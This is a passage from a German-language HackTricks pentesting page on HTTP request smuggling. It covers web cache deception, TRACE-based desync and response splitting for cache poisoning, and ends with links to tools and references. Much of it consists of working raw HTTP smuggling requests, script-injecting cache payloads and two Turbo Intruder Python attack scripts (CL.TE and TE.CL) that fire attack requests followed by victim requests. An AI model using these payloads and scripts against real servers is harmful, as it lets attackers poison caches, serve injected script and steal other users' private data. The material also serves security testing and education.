> **Was ist der Unterschied zwischen Web-Cache-Poisoning und Web-Cache-T√§uschung?**
>
> * Bei **Web-Cache-Poisoning** veranlasst der Angreifer die Anwendung, einige b√∂sartige Inhalte im Cache zu speichern, die dann anderen Anwendungsbenutzern aus dem Cache bereitgestellt werden.
> * Bei **Web-Cache-T√§uschung** veranlasst der Angreifer die Anwendung, einige sensible Inhalte eines anderen Benutzers im Cache zu speichern, und der Angreifer ruft dann diese Inhalte aus dem Cache ab.

Der Angreifer erstellt eine geschmuggelte Anfrage, die sensible benutzerspezifische Inhalte abruft. Betrachten Sie das folgende Beispiel:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Wenn dieser geschmuggelte Request einen Cache-Eintrag vergiftet, der f√ºr statische Inhalte vorgesehen ist (z. B. `/someimage.png`), k√∂nnten die sensiblen Daten des Opfers aus `/private/messages` unter dem Cache-Eintrag des statischen Inhalts zwischengespeichert werden. Folglich k√∂nnte der Angreifer diese zwischengespeicherten sensiblen Daten potenziell abrufen.

### Ausnutzung von TRACE √ºber HTTP-Request-Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In diesem Beitrag**](https://portswigger.net/research/trace-desync-attack) wird vorgeschlagen, dass bei aktivierter TRACE-Methode auf dem Server m√∂glicherweise ein Missbrauch mit Hilfe von HTTP-Request-Smuggling m√∂glich ist. Dies liegt daran, dass diese Methode jeden Header, der an den Server gesendet wird, als Teil des Antwortk√∂rpers widerspiegelt. Zum Beispiel:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Wird eine Antwort wie folgt senden:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Ein Beispiel, wie man dieses Verhalten ausnutzen kann, w√§re zuerst eine HEAD-Anfrage zu **schmuggeln**. Auf diese Anfrage wird nur mit den **Headern** einer GET-Anfrage geantwortet (**`Content-Type`** darunter). Und dann unmittelbar nach der HEAD-Anfrage eine TRACE-Anfrage zu **schmuggeln**, die die gesendeten Daten **reflektiert**. \
Da die HEAD-Antwort einen `Content-Length`-Header enth√§lt, wird die **Antwort der TRACE-Anfrage als Body der HEAD-Antwort behandelt und spiegelt daher beliebige Daten** in der Antwort wider. \
Diese Antwort wird an die n√§chste Anfrage √ºber die Verbindung gesendet, daher k√∂nnte dies z. B. in einer gecachten JS-Datei verwendet werden, um beliebigen JS-Code einzuf√ºgen.

### Missbrauch von TRACE √ºber HTTP-Response-Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Es wird empfohlen, [**diesem Beitrag**](https://portswigger.net/research/trace-desync-attack) weiter zu folgen, um eine weitere M√∂glichkeit zum Missbrauch der TRACE-Methode zu sehen. Wie kommentiert wurde, ist es m√∂glich, durch Schmuggeln einer HEAD-Anfrage und einer TRACE-Anfrage **einige reflektierte Daten** in der Antwort auf die HEAD-Anfrage zu kontrollieren. Die L√§nge des Body der HEAD-Anfrage wird im Wesentlichen im Content-Length-Header angegeben und wird durch die Antwort auf die TRACE-Anfrage gebildet.

Daher w√§re die neue Idee, dass, wenn man dieses Content-Length und die in der TRACE-Antwort gegebenen Daten kennt, es m√∂glich ist, die TRACE-Antwort einen g√ºltigen HTTP-Response nach dem letzten Byte des Content-Length enthalten zu lassen, was einem Angreifer erm√∂glicht, die Anfrage an die n√§chste Antwort vollst√§ndig zu kontrollieren (was zur Durchf√ºhrung einer Cache-Vergiftung verwendet werden k√∂nnte).

Beispiel:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Wird diese Antworten generieren (beachten Sie, wie die HEAD-Antwort eine Content-Length hat, die die TRACE-Antwort zum Teil des HEAD-Body macht und sobald die HEAD Content-Length endet, wird eine g√ºltige HTTP-Antwort geschmuggelt):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(‚Äúarbitrary response‚Äù)</script>
```
### Bewaffnung von HTTP-Request-Smuggling mit HTTP-Response-Desynchronisation

Haben Sie eine HTTP-Request-Smuggling-Schwachstelle gefunden und wissen nicht, wie Sie sie ausnutzen sollen? Probieren Sie diese andere Methode der Ausnutzung:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Andere HTTP-Request-Smuggling-Techniken

* Browser-HTTP-Request-Smuggling (Clientseite)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request-Smuggling bei Downgrades in HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Turbo-Intruder-Skripte

### CL.TE

Von [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Von: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Werkzeuge

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Dieses Tool ist ein auf Grammatik basierender HTTP Fuzzer, der n√ºtzlich ist, um seltsame Anomalien bei der Anforderungsschmuggelung zu finden.

## Referenzen

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
